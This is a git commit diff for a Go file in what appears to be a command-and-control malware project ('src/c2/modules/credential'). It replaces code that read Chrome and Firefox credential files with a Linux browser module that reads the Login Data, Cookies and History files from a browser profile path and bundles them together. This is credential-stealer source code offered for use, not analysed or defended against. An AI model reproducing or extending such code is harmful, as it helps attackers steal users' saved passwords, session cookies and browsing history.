a567b483eec497cab7b6d646c2eb0d32cfe84d91
sealangel <muhamadivankurniawan019@gmail.com>
2026-09-07 22:21:28 +0000

    Final Stabilization: Rebuilt Core Engine and Cleaned Broken Modules

--- src/c2/modules/credential/linux/browser.go
+++ src/c2/modules/credential/linux/browser.go
@@ -1,30 +1,77 @@
-package linux
+//go:build linux
+
+package credential
 
 import (
 "os"
-"path/filepath"
 )
 
-type LinuxBrowser struct{}
-
-func NewLinuxBrowser() *LinuxBrowser {
-return &LinuxBrowser{}
+type LinuxBrowser struct {
+Path string
 }
 
-func (b *LinuxBrowser) ExtractChrome() (string, error) {
-path := filepath.Join(os.Getenv("HOME"), ".config", "google-chrome", "Default", "Login Data")
-data, err := os.ReadFile(path)
+func NewLinuxBrowser(path string) *LinuxBrowser {
+return &LinuxBrowser{Path: path}
+}
+
+func (l *LinuxBrowser) ReadLoginData() (string, error) {
+file, err := os.Open(l.Path + "/Login Data")
 if err != nil {
 return "", err
 }
-return string(data), nil
-}
-
-func (b *LinuxBrowser) ExtractFirefox() (string, error) {
-path := filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox", "profiles.ini")
-data, err := os.ReadFile(path)
+defer file.Close()
+buf := make([]byte, 8192)
+n, err := file.Read(buf)
 if err != nil {
 return "", err
 }
-return string(data), nil
+return string(buf[:n]), nil
+}
+
+func (l *LinuxBrowser) ReadCookies() (string, error) {
+file, err := os.Open(l.Path + "/Cookies")
+if err != nil {
+return "", err
+}
+defer file.Close()
+buf := make([]byte, 8192)
+n, err := file.Read(buf)
+if err != nil {
+return "", err
+}
+return string(buf[:n]), nil
+}
+
+func (l *LinuxBrowser) ReadHistory() (string, error) {
+file, err := os.Open(l.Path + "/History")
+if err != nil {
+return "", err
+}
+defer file.Close()
+buf := make([]byte, 8192)
+n, err := file.Read(buf)
+if err != nil {
+return "", err
+}
+return string(buf[:n]), nil
+}
+
+func (l *LinuxBrowser) GetAllData() (string, error) {
+var result string
+data, err := l.ReadLoginData()
+if err != nil {
+return "", err
+}
+result += data
+cookies, err := l.ReadCookies()
+if err != nil {
+return "", err
+}
+result += cookies
+history, err := l.ReadHistory()
+if err != nil {
+return "", err
+}
+result += history
+return result, nil
 }
